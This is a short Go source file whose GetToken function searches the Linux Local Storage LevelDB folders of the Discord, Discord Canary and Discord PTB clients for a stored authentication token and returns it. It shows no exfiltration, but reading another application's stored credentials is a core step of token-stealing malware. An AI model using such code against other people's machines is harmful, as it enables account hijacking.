//+build linux

package token

import (
	log "github.com/sirupsen/logrus"
	"os"
	"path/filepath"
)

var versions = []string{"discord", "discordcanary", "discordptb"}

func GetToken() (string, error) {
	home, def := os.LookupEnv("HOME")
	if !def {
		return "", ErrorNoHomePath
	}

	for _, ver := range versions {
		path := filepath.Join(home, ".config", ver, "Local Storage/leveldb")
		log.Debugf("Searching for LevelDB database in %v", path)

		tok, err := searchLevelDB(path)
		if err == nil {
			return tok, nil
		}
	}

	return "", ErrorTokenRetrieve
}
